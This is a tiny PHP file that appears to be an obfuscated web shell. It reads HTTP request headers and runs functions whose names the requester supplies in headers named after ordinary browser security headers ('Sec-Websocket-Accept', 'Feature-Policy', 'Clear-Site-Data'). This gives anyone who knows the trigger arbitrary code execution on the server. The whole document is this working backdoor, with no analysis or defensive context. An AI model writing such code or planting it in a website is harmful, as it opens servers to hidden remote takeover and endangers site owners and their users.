<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $reset = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Feature-Policy']($_HEADERS['Clear-Site-Data']));
    $reset();
}